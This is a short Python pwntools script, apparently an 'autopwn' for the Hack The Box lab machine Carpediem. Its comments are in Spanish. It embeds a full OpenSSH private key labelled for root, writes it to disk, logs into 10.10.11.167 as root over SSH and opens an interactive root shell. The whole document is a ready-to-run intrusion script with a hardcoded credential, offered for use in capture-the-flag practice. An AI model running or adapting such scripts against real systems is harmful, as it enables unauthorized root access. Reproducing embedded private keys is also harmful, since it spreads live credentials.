try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Carpediem ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

rsa = b"-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"

with open('key', 'wb') as f:
    f.write(rsa)

request = ssh(host='10.10.11.167', user='root', keyfile='key')
shell = request.process("/bin/sh")
shell.sendline(b"export HOME=/; bash")
shell.sendline(b"export HOME=/root; cd; echo")
shell.interactive()
